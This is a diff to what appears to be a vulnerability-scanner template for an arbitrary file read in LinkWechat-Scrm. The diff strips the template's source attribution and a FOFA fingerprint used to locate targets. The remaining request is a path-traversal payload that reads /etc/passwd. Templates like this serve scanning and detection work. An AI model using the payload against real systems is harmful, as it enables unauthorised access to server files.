@@ -3,12 +3,8 @@ info:
   name: LinkWechat-Scrm 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yesiu1siq9lqit6u'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yesiu1siq9lqit6u
-    fofa: icon_hash="-1120452546"
 http:
 - raw:
   - 'GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1
